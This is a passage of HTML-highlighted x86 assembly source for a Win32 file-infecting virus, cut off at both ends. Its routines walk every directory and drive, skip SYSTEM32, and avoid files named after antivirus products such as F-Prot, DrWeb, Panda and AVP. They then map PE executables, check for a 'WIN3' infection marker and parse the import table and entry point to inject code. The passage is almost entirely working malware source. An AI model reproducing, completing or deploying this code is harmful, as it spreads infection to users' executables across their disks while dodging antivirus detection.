        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ExitFromProcInfectDir</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">files</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc12">'.'</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">l2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">Win32FindData</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FILE_ATTRIBUTE_DIRECTORY</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">l2</span><span class="sc0">
        </span><span class="sc1">;set new dir</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">CurDir2</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetCurrentDirectory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">files</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc1">; SYSTEM32 ?</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">CRCSum</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">SYSTEM32CRC</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">l2</span><span class="sc0"> </span><span class="sc1">;DoNotInfect</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetCurrentDirectory</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Infect_All_files</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">l2</span><span class="sc0">
</span><span class="sc5">ExitFromProcInfectDir</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">Infect_All_files</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">PushWin32FindData</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">@mask</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FindFirstFileA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SearcHandle2</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">l2__</span><span class="sc0">
</span><span class="sc5">Next</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">l2__</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">FileCount</span><span class="sc0">
        </span><span class="sc6">jge</span><span class="sc0">  </span><span class="sc5">l2__</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InfectFile</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">PushWin32FindData</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SearcHandle2</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FindNextFileA</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">9999h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Noerrror</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">Noerrror</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">Next</span><span class="sc0">
</span><span class="sc5">l2__</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">Infect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CurDir</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc2">800</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetCurrentDirectory</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InfectDir</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">DiskCount</span><span class="sc0">
</span><span class="sc5">Scan</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">@disk</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetCurrentDirectory</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InfectDir</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@disk</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">Scan</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CurDir</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetCurrentDirectory</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">InfectFile</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">files</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'-F'</span><span class="sc0">   </span><span class="sc1">;F-port</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">@AV</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'WA'</span><span class="sc0">   </span><span class="sc1">; AW ?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">@AV</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'VA'</span><span class="sc0">   </span><span class="sc1">; AV?????</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">@AV</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc12">'VA'</span><span class="sc0"> </span><span class="sc1">;NAV,PAV,RAV,_AVP???</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">@AV</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc12">'BE'</span><span class="sc0"> </span><span class="sc1">;drWeb</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">@AV</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc12">'DN'</span><span class="sc0"> </span><span class="sc1">;PANDA</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">@AV</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'ITNA'</span><span class="sc1">;ANTI???</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">@AV</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'FASV'</span><span class="sc1">;VSAF???</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">@AV</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'PWSV'</span><span class="sc1">;VSWP???</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">@AV</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'VASF'</span><span class="sc1">;FSAV???</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">@AV</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00000020h</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SetFileAttributesA</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_ARCHIVE</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc5">FILE_SHARE_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">FILE_SHARE_WRITE</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Error__</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LoadMemPointer</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">HhendleOfFile</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetFileSize</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileSize</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">Point@ret</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; to MApViewofFile</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">HhendleOfFile</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateFileMappingA</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">HhendleOfMapFile</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc1">; v steke Size</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_MAP_WRITE</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MapViewOfFile</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Pointer2MapFile</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tag</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc2">6666h</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">OkOb</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc2">40h</span><span class="sc0">
         </span><span class="sc6">jl</span><span class="sc0"> </span><span class="sc5">OOO</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">],</span><span class="sc2">00010000h</span><span class="sc0">
         </span><span class="sc6">jg</span><span class="sc0"> </span><span class="sc5">OOO</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">00004550h</span><span class="sc0"> </span><span class="sc1">;PE Only !</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">  </span><span class="sc5">OOO</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">6fh</span><span class="sc4">],</span><span class="sc2">334e4957h</span><span class="sc0"> </span><span class="sc1">;'WIN3'  Infected ?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">OOO</span><span class="sc0">
         </span><span class="sc1">;find CODE object</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">systemtime</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Import Table RVA</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">6h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Num of Object</span><span class="sc0">
         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Entry point RVA</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@EntryPointRVA</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">24</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;edi=Object Table</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;Import Table RVA</span><span class="sc0">
         </span><span class="sc6">pusha</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">Find_Import_Table</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Object RVA</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">jge</span><span class="sc0"> </span><span class="sc5">Mabe</span><span class="sc0">
</span><span class="sc5">IncEDI</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Not_Find</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Find_Import_Table</span><span class="sc0">
</span><span class="sc5">Mabe</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; SIZE</span><span class="sc0">
         </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">   </span><span class="sc1">; Object RVA =&lt; Import Table RVA =&lt; Object RVA + Phisikal Size</span><span class="sc0">
         </span><span class="sc6">jle</span><span class="sc0"> </span><span class="sc5">L22</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">IncEDI</span><span class="sc0">
         </span><span class="sc5">L22</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">Pointer2MapFile</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;Phis  offset</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                       </span><span class="sc1">; ESI = Phis offset Import Table</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Object RVA</span><span class="sc0">
</span><span class="sc5">ECTLI_KERNEL</span><span class="sc4">:</span><span class="sc0">
